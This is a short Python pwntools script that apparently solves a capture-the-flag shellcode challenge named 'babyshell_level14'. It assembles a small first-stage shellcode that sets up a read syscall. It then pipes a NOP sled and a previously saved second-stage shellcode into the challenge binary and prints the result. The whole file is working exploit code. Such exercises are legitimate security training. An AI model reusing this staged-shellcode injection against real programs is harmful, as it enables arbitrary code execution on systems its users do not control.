#!/usr/bin/env python3

from pwn import *

stage_1 = asm('''
    mov edi, eax
    mov esi, edx
    syscall
''')

p = process('/challenge/babyshell_level14')
stage_2 = b''
# before do this, save the shellcode for level 1 into shellcode-raw
with open('./shellcode-raw', 'rb') as file:
    stage_2 = b'\x90\x90\x90\x90\x90\x90\x90' + file.read()
p.sendline(stage_1 + stage_2)

p.readuntil('Executing shellcode!\n\n')
print(p.readline())
